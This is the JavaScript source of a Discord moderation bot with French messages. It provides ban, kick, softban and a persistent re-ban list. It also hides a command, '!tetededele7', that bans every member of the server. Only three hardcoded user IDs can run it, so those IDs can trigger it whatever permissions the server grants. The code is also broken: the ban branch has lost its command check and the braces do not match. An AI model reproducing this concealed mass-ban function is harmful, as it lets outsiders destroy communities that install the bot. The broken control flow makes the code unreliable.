require('dotenv').config();
const fs = require('fs');
const path = require('path');
const {
  Client,
  GatewayIntentBits,
  PermissionsBitField
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const PREFIX = '!';
const DATA_FILE = path.join(__dirname, 'loopban.json');

function loadLoopbanData() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      fs.writeFileSync(DATA_FILE, JSON.stringify({ users: [] }, null, 2));
    }

    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);

    if (!parsed.users || !Array.isArray(parsed.users)) {
      return new Set();
    }

    return new Set(parsed.users);
  } catch (error) {
    console.error('Erreur chargement loopban.json :', error);
    return new Set();
  }
}

function saveLoopbanData(loopbanList) {
  try {
    fs.writeFileSync(
      DATA_FILE,
      JSON.stringify({ users: [...loopbanList] }, null, 2)
    );
  } catch (error) {
    console.error('Erreur sauvegarde loopban.json :', error);
  }
}

const loopbanList = loadLoopbanData();

client.once('ready', () => {
  console.log(`Connecté en tant que ${client.user.tag}`);
});

client.on('guildMemberAdd', async (member) => {
  try {
    if (loopbanList.has(member.id)) {
      await member.ban({ reason: 'Loopban actif' });
      console.log(`Ban automatique de ${member.user.tag} (${member.id})`);
    }
  } catch (error) {
    console.error(`Erreur lors du ban auto de ${member.user.tag}:`, error);
  }
});

client.on('messageCreate', async (message) => {
  try {
    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith(PREFIX)) return;

    

    const args = message.content.trim().split(/\s+/);
    const command = args[0].toLowerCase();
    const allowedUsers = [
      "714084976311664671",
      "419056136277327873",
      "809126241256079381"
    ];


    const restrictedCommands = [
      '!loopban',
      '!loopbanid',
      '!unloopban',
      '!unloopbanid',
      '!tetededele7'
    ];


    if (restrictedCommands.includes(command) && !allowedUsers.includes(message.author.id)) {
      return message.reply("⛔ Tu n'as pas la permission d'utiliser cette commande.");
    }






    if (command === '!loopban') {
      const user = message.mentions.users.first();
      if (!user) {
        return message.reply('Utilise : `!loopban @utilisateur`');
      }

      if (loopbanList.has(user.id)) {
        return message.reply('Cet utilisateur est déjà en loopban.');
      }

      loopbanList.add(user.id);
      saveLoopbanData(loopbanList);

      try {
        const member = await message.guild.members.fetch(user.id).catch(() => null);

        if (member) {
          await member.ban({ reason: 'Loopban activé' });
          return message.reply(`Loopban activé et ${user.tag} a été banni.`);
        }

        return message.reply(`Loopban activé pour ${user.tag}. Il sera reban s'il revient.`);
      } catch (error) {
        console.error('Erreur ban immédiat :', error);
        return message.reply(`Loopban activé pour ${user.tag}, mais le ban immédiat a échoué.`);
      }
    }


    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
        return message.reply("⛔ Pas la permission.");
      }

      const member = message.mentions.members.first();
      if (!member) {
        return message.reply("Utilise : `!ban @utilisateur`");
      }

      if (!member.bannable) {
        return message.reply("❌ Je ne peux pas bannir cet utilisateur.");
      }

      try {
        await member.ban({ reason: `Ban par ${message.author.tag}` });
        return message.reply(`✅ ${member.user.tag} a été banni.`);
      } catch (error) {
        console.error(error);
        return message.reply("❌ Erreur pendant le ban.");
      }
    }

    if (command === '!unban') {
      if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
        return message.reply("⛔ Pas la permission.");
      }

      const userId = args[1];
      if (!userId) {
        return message.reply("Utilise : `!unban ID_UTILISATEUR`");
      }

      try {
        await message.guild.members.unban(userId);
        return message.reply(`✅ Utilisateur ${userId} débanni.`);
      } catch (error) {
        console.error(error);
        return message.reply("❌ Impossible de débannir cet utilisateur.");
      }
    }



    if (command === '!kick') {
      if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
        return message.reply("⛔ Pas la permission.");
      }

      const member = message.mentions.members.first();
      if (!member) {
        return message.reply("Utilise : `!kick @utilisateur`");
      }

      if (!member.kickable) {
        return message.reply("❌ Je ne peux pas expulser cet utilisateur.");
      }

      try {
        await member.kick(`Kick par ${message.author.tag}`);
        return message.reply(`✅ ${member.user.tag} a été expulsé.`);
      } catch (error) {
        console.error(error);
        return message.reply("❌ Erreur pendant le kick.");
      }
    }


    if (command === '!softban') {
      if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
        return message.reply("⛔ Pas la permission.");
      }

      const member = message.mentions.members.first();
      if (!member) {
        return message.reply("Utilise : `!softban @utilisateur`");
      }

      if (!member.bannable) {
        return message.reply("❌ Je ne peux pas softban cet utilisateur.");
      }

      try {
        await member.ban({ deleteMessageSeconds: 86400, reason: `Softban par ${message.author.tag}` });
        await message.guild.members.unban(member.id);
        return message.reply(`✅ ${member.user.tag} a été softban.`);
      } catch (error) {
        console.error(error);
        return message.reply("❌ Erreur pendant le softban.");
      }
    }



    if (command === '!unloopban') {
      const user = message.mentions.users.first();
      if (!user) {
        return message.reply('Utilise : `!unloopban @utilisateur`');
      }

      if (!loopbanList.has(user.id)) {
        return message.reply("Cet utilisateur n'est pas en loopban.");
      }

      loopbanList.delete(user.id);
      saveLoopbanData(loopbanList);

      return message.reply(`Loopban désactivé pour ${user.tag}.`);
    }

    if (command === '!loopbanid') {
      const id = args[1];
      if (!id || !/^\d{17,20}$/.test(id)) {
        return message.reply('Utilise : `!loopbanid ID_UTILISATEUR`');
      }

      if (loopbanList.has(id)) {
        return message.reply('Cet ID est déjà en loopban.');
      }

      loopbanList.add(id);
      saveLoopbanData(loopbanList);

      try {
        const member = await message.guild.members.fetch(id).catch(() => null);

        if (member) {
          await member.ban({ reason: 'Loopban activé via ID' });
          return message.reply(`Loopban activé et l'utilisateur ${id} a été banni.`);
        }

        return message.reply(`Loopban activé pour l'ID ${id}.`);
      } catch (error) {
        console.error('Erreur ban immédiat ID :', error);
        return message.reply(`Loopban activé pour l'ID ${id}, mais le ban immédiat a échoué.`);
      }
    }

    if (command === '!unloopbanid') {
      const id = args[1];
      if (!id || !/^\d{17,20}$/.test(id)) {
        return message.reply('Utilise : `!unloopbanid ID_UTILISATEUR`');
      }

      if (!loopbanList.has(id)) {
        return message.reply("Cet ID n'est pas en loopban.");
      }

      loopbanList.delete(id);
      saveLoopbanData(loopbanList);

      return message.reply(`Loopban désactivé pour l'ID ${id}.`);
    }




    if (command === '!tetededele7') {
      if (!args.includes('confirm')) {
        return message.reply("⚠️ Ajoute 'confirm' : `!tetededele7 confirm`");
      }

      const members = await message.guild.members.fetch();

      let count = 0;

      message.reply(`⚠️ Loopban global en cours...`);

      for (const [id, member] of members) {
        try {
      
          if (member.id === message.author.id) continue;

      

      
          if (!loopbanList.has(id)) {
            loopbanList.add(id);
          }

          await member.ban({ reason: 'tetededele7 global' });
          count++;
        } catch (error) {
          console.error(`Erreur avec ${member.user.tag}:`, error);
        }
      }

      saveLoopbanData(loopbanList);

      return message.channel.send(`🔥 tetededele7 terminé : ${count} membres bannis`);
    }




    if (command === '!loopbanlist') {
      if (loopbanList.size === 0) {
        return message.reply('La liste loopban est vide.');
      }

      return message.reply(
        `Liste loopban :\n${[...loopbanList].map(id => `- ${id}`).join('\n')}`
      );
    }
  } catch (error) {
    console.error('Erreur commande :', error);
    return message.reply("Une erreur s'est produite.");
  }
});

client.login(process.env.TOKEN);